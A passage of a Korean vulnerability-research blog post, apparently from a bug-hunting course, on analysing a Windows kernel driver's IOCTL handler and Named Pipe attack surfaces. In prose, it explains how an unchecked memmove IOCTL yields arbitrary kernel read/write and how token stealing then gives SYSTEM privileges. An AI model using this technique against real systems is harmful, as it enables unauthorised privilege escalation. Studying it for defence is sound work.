&#xC800;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC774;&#xAC78; &#xBD84;&#xC11D; &#xBCA1;&#xD130;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xACE0; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image8.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; <code>DispatchDeviceControl</code> &#xB0B4;&#xBD80;&#xC758; switch-case&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; IOCTL &#xBD84;&#xAE30; &#xAD6C;&#xC870;&#xB97C; &#xC5ED;&#xCD94;&#xC801;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC704; WDM &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAC19;&#xC740; &#xACBD;&#xC6B0; <code>DispatchDeviceControl</code> &#xB0B4;&#xBD80; switch-case&#xC5D0;&#xC11C; &#xD2B9;&#xC815; IOCTL Cases&#xB4E4;&#xC774; <code>0x80002000</code>, <code>0x80002004</code>, <code>0x8000201C</code>&#x2026; &#xD615;&#xD0DC;&#xB85C; &#xBD84;&#xAE30;&#xB97C; &#xD0C0;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; <code>MmMapIoSpace</code> &#xD638;&#xCD9C;&#xACFC; &#xC9C1;&#xC811; &#xC5F0;&#xACB0;&#xB418;&#xB294; IOCTL Case&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xCF00;&#xC774;&#xC2A4;&#xB4E4;&#xC744; &#xD589;&#xC704; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xD558;&#xBA74;&#xC11C; &#xC635;&#xC158; &#xAC12;, &#xAE38;&#xC774;, &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC;&#xAC19;&#xC740; &#xC785;&#xB825; &#xAC80;&#xC99D;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image9.png" alt></p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image10.png" alt></p><p>&#xC608;&#xB97C;&#xB4E4;&#xBA74; &#xC774; &#xBD84;&#xC11D;&#xC5D0;&#xC11C; &#xD575;&#xC2EC;&#xC73C;&#xB85C; &#xBCF8; &#xC9C0;&#xC810;&#xC740; <code>0x8000202C</code> Case&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCF00;&#xC774;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; IRP &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC624;&#xD504;&#xC14B; &#xAC12;&#xC744; <code>dst</code>/<code>src</code>/<code>size</code> &#xAC19;&#xC740; &#xC778;&#xC790;&#xB85C; &#xD574;&#xC11D;&#xD574; &#xCD94;&#xCD9C;&#xD574;&#xC11C; <code>memmove</code>&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD750;&#xB984;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xB370;&#xC694;. WDM &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; <code>DeviceIoControl</code> &#xACBD;&#xB85C;&#xC5D0;&#xC11C; IOCTL&#xC774; <code>METHOD_BUFFERED</code>&#xB77C;&#xBA74; I/O Manager&#xC740; <code>IRP&#x2192;AssociatedIrp.SystemBuffer</code>&#xC5D0; &#xCEE4;&#xB110;&#xC774; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xACE0;, &#xADF8; &#xBC84;&#xD37C; &#xC548;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC720;&#xC800; &#xC778;&#xD48B;&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xD574;&#xC11C; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image11.png" alt></p><p><code>0x8000202C</code> Case&#xC5D0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC9C4;&#xC785;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, &#xC785;&#xB825; &#xBC84;&#xD37C; &#xAE38;&#xC774; <code>0x38</code>&#xB9CC; &#xB9DE;&#xC73C;&#xBA74;, &#xADF8; &#xBC84;&#xD37C; &#xC548;&#xC758; &#xC624;&#xD504;&#xC14B;(+<code>0x20</code>/+<code>0x28</code>/+<code>0x30</code>)&#xC5D0;&#xC11C; &#xAEBC;&#xB0B8; &#xAC12;&#xC744; &#xD3EC;&#xC778;&#xD130;/&#xAE38;&#xC774;&#xB85C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; <code>memmove(dst, src, size)</code>&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB124;&#xC694;. &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; read/ write primitive&#xAC00; &#xC131;&#xB9BD;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image12.png" alt></p><p>&#xC774;&#xD6C4; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xB0B8; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; WinDBG&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xD750;&#xB984;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; <code>0x8000202C</code>&#xC5D0;&#xC11C; <code>SystemBuffer(rsi)+0x20/0x28/0x30</code> &#xAC12;&#xC744; <code>memmove(dst, src, size)</code>&#xC5D0; &#xB123;&#xB294;&#xB2E4;&#xB294;&#xAC78; &#xD655;&#xC778;&#xD588;&#xB294;&#xB370;, payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; <code>rsi</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>METHOD_BUFFERED</code>&#xC758; <code>SystemBuffer</code> &#xC8FC;&#xBCC0;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;&#x2026; &#xC758;&#xB3C4;&#xD55C;&#xB300;&#xB85C;  &#x2018;<code>A</code>&#x2019;&#xB85C; &#xB36E;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;?</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image13.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD655;&#xC778;&#xD588;&#xB2E4;&#xBA74; &#xC774;&#xC81C; exploit&#xC744; &#xD574;&#xC8FC;&#xBA74; &#xB418;&#xB294;&#xB370;&#xC694; &#xC608;&#xC2DC;&#xB85C; &#xC704;&#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; IOCTL &#xC785;&#xB825; &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xB2E4; <code>dst=output_buf</code>(&#xC720;&#xC800; &#xC8FC;&#xC18C;), <code>src=&#xC77D;&#xACE0; &#xC2F6;&#xC740; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;</code>, <code>size=8</code>&#xC744; &#xB123;&#xC5B4; <code>DeviceIoControl</code>&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xCEE4;&#xB110;&#xC774; <code>memmove(dst, src, size)</code>&#xB97C; &#xC218;&#xD589;&#xD558;&#xBA74;&#xC11C; 8&#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704; Arbitrary Read&#xAC00; &#xC131;&#xB9BD;&#xD569;&#xB2C8;&#xB2E4;. &#xC708;&#xB3C4;&#xC6B0; &#xBC84;&#xADF8; &#xCC3E;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xC775;&#xC219;&#xD55C; &#xCE5C;&#xAD6C;&#xC778; <code>NtQuerySystemInformation</code> &#xD578;&#xB4E4; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD1B5;&#xD574; EPROCESS &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xACE0;, &#xC774;&#xB807;&#xAC8C; &#xC5BB;&#xC740; SYSTEM EPROCESS &#xC8FC;&#xC18C;&#xC5D0; TOKENOFFSET&#xC744; &#xB354;&#xD574; <code>EPROCESS-&gt;Token</code> &#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xC628; &#xD6C4;, &#xB2E4;&#xC2DC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD604;&#xC7AC; EPROCESS &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD574; Token &#xD544;&#xB4DC; &#xC704;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD55C; &#xB4A4;, IOCTL&#xC5D0; <code>dst=&#xD604;&#xC7AC; EPROCESS+TOKENOFFSET</code>, <code>src=&#xC900;&#xBE44;&#xD55C; SYSTEM &#xD1A0;&#xD070; &#xD3EC;&#xC778;&#xD130;</code>, <code>size=8</code> &#xC774;&#xB807;&#xAC8C; &#xB123;&#xC5B4;&#xC11C; Arbitrary Write&#xB97C; &#xC218;&#xD589;&#xD574; Privilege escalation&#xC744; &#xC131;&#xACF5;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xB4EF; &#xC138;&#xBD80; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xAD6C;&#xC131;&#xC740; &#xB098;&#xD0C0;&#xB09C; &#xCDE8;&#xC57D;&#xC810; &#xC720;&#xD615;&#xC5D0; &#xB530;&#xB77C; &#xAD6C;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.<br><br>   </p><h2 id="Chapter-2-Named-Pipe-as-an-Attack-Surface"><a href="#Chapter-2-Named-Pipe-as-an-Attack-Surface" class="headerlink" title="Chapter 2: Named Pipe as an Attack Surface"></a>Chapter 2: Named Pipe as an Attack Surface</h2><h3 id="2-1-Named-Pipe-&#xACF5;&#xACA9;-&#xD45C;&#xBA74;-&#xAC1C;&#xC694;"><a href="#2-1-Named-Pipe-&#xACF5;&#xACA9;-&#xD45C;&#xBA74;-&#xAC1C;&#xC694;" class="headerlink" title="2.1 Named Pipe &#xACF5;&#xACA9; &#xD45C;&#xBA74; &#xAC1C;&#xC694;"></a>2.1 Named Pipe &#xACF5;&#xACA9; &#xD45C;&#xBA74; &#xAC1C;&#xC694;</h3><p>&#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xB2E4;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; Named Pipe&#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xCC28;&#xB840;&#xC778;&#xB370;&#xC694;. Named Pipe &#xD1B5;&#xC2E0; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD55C; &#xC57D;&#xAC04;&#xC758; &#xC774;&#xD574;&#xB97C; &#xC804;&#xC81C;&#xD558;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAD00;&#xB828;&#xB41C; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; <a href="https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/KR/">&#x1F449;&#xC5EC;&#xAE30;&#xC5D0; &#xC788;&#xC73C;&#xB2C8;</a> &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACE0; &#xC624;&#xC2DC;&#xB294;&#xAC78; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;! Named Pipe&#xB294; IPC &#xD1B5;&#xC2E0; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xB418;&#xC9C0;&#xB9CC;, &#xCEE4;&#xB110; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; SYSTEM &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBE48;&#xBC88;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; Named Pipe &#xC785;&#xB825;&#xC744; &#xBCF4;&#xB0B8; &#xB4A4;&#xC5D0; &#xC774;&#xAC78; &#xB0B4;&#xBD80; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xD30C;&#xC2F1;&#xD558;&#xAC70;&#xB098; &#xAD8C;&#xD55C; &#xBCC0;&#xACBD;, &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xB3D9;&#xC791;, &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589;&#xAC19;&#xC740; &#xBBFC;&#xAC10; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xAF64; &#xB9CE;&#xC544;&#xC11C; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD558;&#xBA74; LPE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IPC&#xB294; IOCTL&#xACFC; &#xB2E4;&#xB974;&#xAC8C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC811;&#xADFC;&#xD574;&#xBD10;&#xC57C; &#xD560;&#xC9C0; &#xAD81;&#xAE08;&#xD558;&#xC2DC;&#xC8E0;? &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!<br><br>  </p><h3 id="2-2-Named-Pipe-&#xD0C0;&#xAC9F;-&#xC218;&#xC9D1;"><a href="#2-2-Named-Pipe-&#xD0C0;&#xAC9F;-&#xC218;&#xC9D1;" class="headerlink" title="2.2 Named Pipe &#xD0C0;&#xAC9F; &#xC218;&#xC9D1;"></a>2.2 Named Pipe &#xD0C0;&#xAC9F; &#xC218;&#xC9D1;</h3><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xD0C0;&#xAC9F; &#xC218;&#xC9D1;&#xC740; &#xBA3C;&#xC800; (1) SYSTEM/&#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD6C4;&#xBCF4;&#xB97C; &#xACE0;&#xB9AC;&#xACE0;, (2) &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC774;&#xD504; &#xD578;&#xB4E4;&#xC744; &#xD655;&#xBCF4;&#xD55C; &#xB2E4;&#xC74C;&#xC5D0;, (3) &#xD30C;&#xC774;&#xD504; ACL&#xC744; &#xD1B5;&#xD574; Everyone &#xAC19;&#xC740; &#xBE44;&#xAD00;&#xB9AC;&#xC790;&#xAC00; Read Write &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xB294; &#xC21C;&#xC11C;&#xB85C; &#xC9C4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image14.png" alt></p><p>&#xBA3C;&#xC800; Process Explorer&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD6C4;&#xBCF4;&#xB97C; &#xC7A1;&#xC73C;&#xBA74;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC81C;&#xAC00; &#xC7A1;&#xB294; &#xAE30;&#xC900;&#xC740; &#xC2E4;&#xD589; &#xACC4;&#xC815;&#xC774; SYSTEM &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778;&#xC9C0;, &#xC11C;&#xB4DC;&#xD30C;&#xD2F0; &#xC11C;&#xBE44;&#xC2A4;&#xC778;&#xC9C0;, HANDLE&#xC5D0; Named Pipe&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0;, Integrity Level&#xC774; SYSTEM&#xC778;&#xC9C0; &#xC815;&#xB3C4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xD0C0;&#xAC9F;&#xC744; &#xC881;&#xD600;&#xAC11;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image15.png" alt></p><p>&#xD2B9;&#xD788; Process Explorer &#xD558;&#xB2E8;&#xC758; Handles &#xD0ED;&#xC5D0;&#xC11C; NamedPipe&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC774;&#xB54C; Type&#xC774; <code>File</code>&#xB85C; &#xC7A1;&#xD788;&#xBA74;&#xC11C; Name&#xC774; <code>\Device\NamedPipe\&#x2026;</code> &#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC774; Named Pipe&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC218;&#xC9D1;&#xB41C; <code>\Device\NamedPipe\&#x2026;</code>&#xACBD;&#xB85C;&#xB294; &#xB294; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; <code>\.\pipe\&#x2026;</code> &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC9C0;&#xC810;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image16.png" alt></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xAC00;&#xC7A5; &#xD070; &#xAD00;&#xBB38;&#xC774; &#xD558;&#xB098; &#xB0A8;&#xC544;&#xC788;&#xB294;&#xB370;&#xC694;.. &#xBC14;&#xB85C; ACL&#xC785;&#xB2C8;&#xB2E4;. &#xD798;&#xB4E4;&#xAC8C; Named Pipe&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xAC78; &#xD655;&#xC778;&#xD588;&#xB294;&#xB370; &#xC774;&#xAC78; &#xC77D;&#xACE0; &#xC4F8; &#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xBA74;&#x2026; &#xADF8; Named Pipe&#xC640;&#xB294; &#xC791;&#xBCC4;&#xC778;&#xC0AC;&#xB97C; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.&#x1F62D;  Administrators&#xB9CC; RW&#xC774;&#xACE0; &#xB098;&#xBA38;&#xC9C0;&#xC5D0;&#xAC90; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC73C;&#xBA74; LPE&#xAC00; &#xC131;&#xACF5;&#xD558;&#xB294; &#xBCA1;&#xD130;&#xB85C; &#xBCF4;&#xAE30; &#xD798;&#xB4E4;&#xACE0;, Everyone, Authenticated Users, Users &#xAC19;&#xC740; &#xAD11;&#xBC94;&#xC704;&#xD55C; &#xADF8;&#xB8F9;&#xC5D0; RW&#xAC00; &#xC5F4;&#xB824; &#xC788;&#xB294;&#xC9C0; accesschk&#xAC19;&#xC740; &#xD234;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xD30C;&#xC774;&#xD504; ACL&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xD0C0;&#xAC9F;&#xC744; &#xC881;&#xD600;&#xB098;&#xAC00;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image17.png" alt></p><p>&#xADF8;&#xB807;&#xAC8C; &#xD0C0;&#xAC9F;&#xC744; &#xC120;&#xC815;&#xD588;&#xB2E4;&#xBA74;, &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC5F4;&#xC5B4;&#xC11C; <code>CreateNamedPipeA/W</code>, <code>ConnectNamedPipe</code>, <code>DisconnectNamedPipe</code> &#xAC19;&#xC740; API&#xB4E4;&#xC744; &#xBE60;&#xB974;&#xAC8C; &#xAC80;&#xC0C9;&#xD574;&#xC11C; &#xC774;&#xAC8C; &#xC11C;&#xBC84; &#xAD6C;&#xD604;&#xC774; &#xB9DE;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, <code>Connect &#x2192; Read</code> &#xD750;&#xB984;, &#xD30C;&#xC2F1; &#xBD84;&#xAE30;, &#xD1A0;&#xD070;/&#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC19;&#xC740; &#xAD8C;&#xD55C; &#xAD00;&#xB828; &#xBD84;&#xAE30;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; &#xD0C0;&#xAC9F; &#xC218;&#xC9D1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xB05D;&#xC774; &#xB0A9;&#xB2C8;&#xB2E4;.<br><br>  </p><h3 id="2-3-Named-Pipe-&#xBD84;&#xC11D;"><a href="#2-3-Named-Pipe-&#xBD84;&#xC11D;" class="headerlink" title="2.3 Named Pipe &#xBD84;&#xC11D;"></a>2.3 Named Pipe &#xBD84;&#xC11D;</h3><p>&#xBD84;&#xC11D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC21C;&#xC11C;&#xB85C; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Process Explorer&#xB85C; &#xC11C;&#xBC84;(SYSTEM &#xC11C;&#xBE44;&#xC2A4;) &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD6C4;&#xBCF4; &#xC120;&#xC815;</li><li>&#xC218;&#xC9D1;&#xD55C; <code>\Device\NamedPipe\...</code>&#xAC00; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; <code>\\.\pipe\...</code>&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xB294; &#xC9C0;&#xC810;&#xC778;&#xC9C0; &#xD655;&#xC778;</li><li>accesschk&#xB85C; Pipe ACL &#xC810;&#xAC80; &#x2192; Everyone&#xAC19;&#xC740; &#xAD11;&#xBC94;&#xC704; &#xADF8;&#xB8F9; Read/Write &#xC5F4;&#xB9BC; &#xC5EC;&#xBD80; &#xD655;&#xC778;</li><li>IDA&#xB85C; <code>CreateNamedPipe*</code> &#x2192; <code>ConnectNamedPipe</code> &#x2192; <code>ReadFile/WriteFile</code> &#xAC19;&#xC740; &#xD750;&#xB984;&#xACFC; &#xC694;&#xCCAD; &#xCC98;&#xB9AC; &#xD568;&#xC218; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xC7A1;&#xAE30;</li><li>&#xC5B4;&#xB5A4; &#xC694;&#xCCAD;&#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;/HKLM, &#xC11C;&#xBE44;&#xC2A4; &#xC124;&#xC815; &#xB4F1; &#xAD8C;&#xD55C;&#xC774; &#xC911;&#xC694;&#xD55C; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xBD84;&#xAE30;&#xB85C; &#xC881;&#xD788;&#xAE30;</li><li>ProcMon &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC774;&#xBCA4;&#xD2B8; &#xC7A1;&#xC73C;&#xBA74;&#xC11C; &#xB3D9;&#xC801;&#xBD84;&#xC11D; &#xC218;&#xD589;</li></ol><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image18.png" alt></p><p>&#xD0C0;&#xAC9F;&#xC744; &#xC815;&#xD588;&#xC73C;&#xBA74; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC740; procmon&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xD30C;&#xC774;&#xD504; I/O&#xAC00; &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xD55C; &#xD589;&#xC704;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xD30C;&#xC774;&#xD504;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC218;&#xC2E0;&#xD558;&#xB294; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xD30C;&#xC774;&#xD504;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; &#xC1A1;&#xC2E0;&#xD558;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC881;&#xD78C; &#xD6C4;&#xC5D0;, <code>CreateNamedPipe</code>, <code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>&#xAC19;&#xC740; IPC &#xD638;&#xCD9C; &#xD750;&#xB984;&#xC744; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBC94;&#xC704;&#xC5D0;&#xC11C; &#xCD94;&#xC801;&#xD560; &#xC900;&#xBE44;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; <code>Process Name</code>, <code>Operation</code>&#xC5D0; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4; &#xAD00;&#xB828;&#xB41C; &#xC774;&#xBCA4;&#xD2B8;&#xB098; named pipe &#xD575;&#xC2EC; I/O &#xC774;&#xBCA4;&#xD2B8;&#xB97C; Filter&#xC5D0; &#xB4F1;&#xB85D;&#xD558;&#xACE0;, &#xC11C;&#xBC84; Integrity&#xAC00; System&#xC778;&#xC9C0; &#xD544;&#xD130;&#xB85C; &#xACE0;&#xC815;&#xD574;&#xB450;&#xB294;&#xAC8C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAC8C; &#xD574;&#xC57C; &#xC720;&#xC800; &#xC785;&#xB825;&#xC774; SYSTEM&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30;&#xC5D0; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/28/banda/WHS3-bughunting/ko/image19.png" alt></p><p>&#xB9C8;&#xCE68; &#xC81C;&#xAC00; &#xBD84;&#xC11D;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; &#xC124;&#xC815;&#xC5D0; Non Admin&#xB3C4; Access Control&#xB85C; &#xC77C;&#xBD80; &#xAD00;&#xB9AC; &#xAE30;&#xB2A5;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xB294; &#xCCB4;&#xD06C;&#xBC15;&#xC2A4;&#xAC00; &#xC788;&#xB124;&#xC694;.. &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB2C8;&#xAE4C; &#xADF8;&#xB7F4;&#xB9CC;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xBCF4;&#xD1B5; &#xC774;&#xB807;&#xC9C0;&#xB294; 